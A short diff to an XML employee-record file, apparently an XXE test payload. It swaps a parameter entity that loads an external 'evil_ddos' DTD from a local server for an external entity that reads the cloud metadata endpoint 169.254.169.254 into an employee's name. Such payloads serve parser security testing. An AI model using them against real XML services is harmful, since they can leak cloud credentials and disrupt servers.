@@ -2,7 +2,7 @@
 
 <!DOCTYPE Company
 [
- <!ENTITY % aaa SYSTEM "http://172.17.0.1:8888/3_evil_ddos.dtd" > %aaa;
+<!ENTITY placeholder SYSTEM "http://169.254.169.254/latest/meta-data/" >
 ]>
 
 <Company>
@@ -10,7 +10,7 @@
     <employees>
         <permanent>
             <employee id="1">
-                <name>Tom &five;</name>
+                <name>Tom &placeholder;</name>
                 <age>42</age>
                 <email>tom@abc.com</email>
             </employee>
